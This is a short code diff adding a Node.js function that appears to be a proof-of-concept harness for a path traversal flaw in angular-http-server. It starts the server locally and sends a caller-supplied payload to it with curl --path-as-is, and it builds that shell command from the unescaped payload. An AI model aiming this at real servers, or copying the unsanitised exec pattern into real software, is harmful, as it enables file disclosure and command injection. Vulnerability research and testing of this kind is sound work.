@@ -1,0 +1,28 @@
+function exploitFunction(payload) {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const { exec } = require("child_process");
+
+  const serverCommand = "node ./node_modules/angular-http-server/angular-http-server.js";
+
+  exec(serverCommand, (error, stdout) => {
+    if (error) {
+      console.error(`Error starting server: ${error}`);
+      return;
+    }
+
+    sleep.sleep(2);
+
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8000${payload}"`;
+
+    exec(attack_string, (error, stdout) => {
+      if (error) {
+        console.error(`Error executing attack: ${error}`);
+        return;
+      }
+      return stdout;
+    });
+  });
+}
+
+module.exports = { exploitFunction };
